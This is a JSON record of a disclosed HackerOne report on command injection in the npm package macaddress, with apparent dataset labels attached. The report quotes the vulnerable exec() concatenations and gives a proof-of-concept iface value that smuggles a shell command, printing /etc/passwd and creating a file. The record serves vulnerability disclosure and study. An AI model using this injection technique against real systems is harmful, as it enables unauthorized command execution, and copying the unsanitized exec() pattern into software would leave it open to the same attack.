{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "`macaddress` concatenates unsanitized input into exec() command",
  "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\nI would like to report code injection in macaddress\nIt allows to inject arbitrary shell commands if the user input can influence the iface argument.\nModule\nmodule name: macaddress\nversion: 0.2.8\nnpm page: https://www.npmjs.com/package/macaddress\nModule Description\nRetrieve MAC addresses in Linux, OS X, and Windows.\nModule Stats\n81 238 downloads in the last day\n1 632 083 downloads in the last week\n7 031 342 downloads in the last month\n~84376104 estimated downloads per year [JUST FOR REFERENCE, ~DOWNLOADS PER MONTH*12]\nVulnerability\nVulnerability Description\n(async) .one(iface, callback) \u2192 string API does not escape or sanitize iface argument, and concatenates it to a shell command, passing it to exec.\nExact lines:\nCode 242 Bytes\n1lib/linux.js:4:    exec(\"cat /sys/class/net/\" + iface + \"/address\", function (err, out) {\n2lib/macosx.js:4:    exec(\"networksetup -getmacaddress \" + iface, function (err, out) {\n3lib/unix.js:4:    exec(\"ifconfig \" + iface, function (err, out) {\nSteps To Reproduce:\nFor Linux, use the following example:\nCode 172 Bytes\n1let iface = '../../../etc/passwd; touch /tmp/poof; echo ';\n2require('macaddress').one(iface, function (err, mac) {\n3  console.log(\"Mac address for this host: %s\", mac);  \n4});\nObserve /etc/passwd printed into the console, /tmp/poof file created.\nFor other OS, the testcase is similar.\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nArch Linux Current\nNode.js 9.5.0\nnpm 5.6.0\nWrap up\nI contacted the maintainer to let him know: N\nI opened an issue in the related repository: N\nImpact\nExecute arbitrary shell commands if that parameter is user-controlled.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1526084040,
  "report_url": "https://hackerone.com/reports/319467",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "let iface = '../../../etc/passwd; touch /tmp/poof; echo ';"
    ],
    [
      2,
      "require('macaddress').one(iface, function (err, mac) { console.log(\"Mac address for this host: %s\", mac); });"
    ]
  ],
  "vuln_description": "The `macaddress` module's `.one(iface, callback)` API does not sanitize the `iface` argument before concatenating it into a shell command passed to `exec()`. This allows command injection if the `iface` parameter is user-controlled.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being used in command execution. The attack vector is direct and doesn't require complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves code injection through unsanitized input in the `macaddress` module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by manipulating user sessions and resource IDs within the same application context. Since this is a command injection vulnerability that occurs due to improper input sanitization in a Node.js module, it falls outside the scope of the described detection methods.",
    "is_detectable": false
  }
}